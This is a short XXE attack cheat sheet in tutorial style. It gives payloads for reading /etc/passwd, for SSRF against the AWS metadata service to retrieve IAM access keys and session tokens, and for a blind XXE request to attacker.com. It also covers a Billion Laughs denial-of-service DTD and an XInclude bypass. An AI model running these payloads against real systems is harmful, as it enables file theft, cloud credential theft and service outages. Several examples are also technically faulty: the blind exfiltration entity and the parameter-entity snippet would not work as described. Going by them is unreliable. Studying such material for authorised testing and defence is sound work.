What is XXE?
XXE (XML External Entity) is a vulnerability that occurs when:
An application parses XML input
And allows external entities to be defined and processed

👉 This lets an attacker:

Read files
Perform SSRF
Cause DoS
Exfiltrate data
⚙️ Basic XML concept (important)
Normal XML

<user>
  <name>kaushal</name>
</user>

XML with ENTITY

<!DOCTYPE foo [
  <!ENTITY test "Hello">
]>
<user>
  <name>&test;</name>
</user>

👉 Output:
Hello
🔥 XXE Attack Core Idea

Instead of normal value, you define:

<!ENTITY xxe SYSTEM "file:///etc/passwd">

👉 Now:

<name>&xxe;</name>

👉 Server reads file and injects content

📂 1. File Read (Classic XXE)

Payload
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
Result
root:x:0:0:root:/root:/bin/bash
...


🌐 2. XXE → SSRF (Very Important)

👉 Use URL instead of file:

<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
Real attack flow (AWS metadata)
Step 1: Get role
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
Step 2: Get secrets
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">
Output
{
  "AccessKeyId": "...",
  "SecretAccessKey": "...",
  "Token": "..."
}

👉 This is critical (P1 bug)



🕶️ 3. Blind XXE (No direct response)

When response doesn’t show data.
Use external server:
<!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd">
👉 Server sends request to attacker → data leak



💣 4. Billion Laughs (DoS attack)
<!DOCTYPE lolz [
 <!ENTITY a "lol">
 <!ENTITY b "&a;&a;&a;&a;&a;">
 <!ENTITY c "&b;&b;&b;&b;&b;">
]>
👉 Causes memory exhaustion → crash



🔁 5. Parameter Entities (Advanced XXE)
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY data "%xxe;">
]>
🚫 When XXE DOESN’T work
Input is not parsed as XML
DTD is disabled
External entities blocked


🔥 Bypass techniques
1. XInclude (when no DOCTYPE)
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude"
            href="file:///etc/passwd"
            parse="text"/>
2. SVG upload XXE
3. File upload (DOCX, XLSX, etc.)
👉 These are ZIP + XML → inject XXE inside

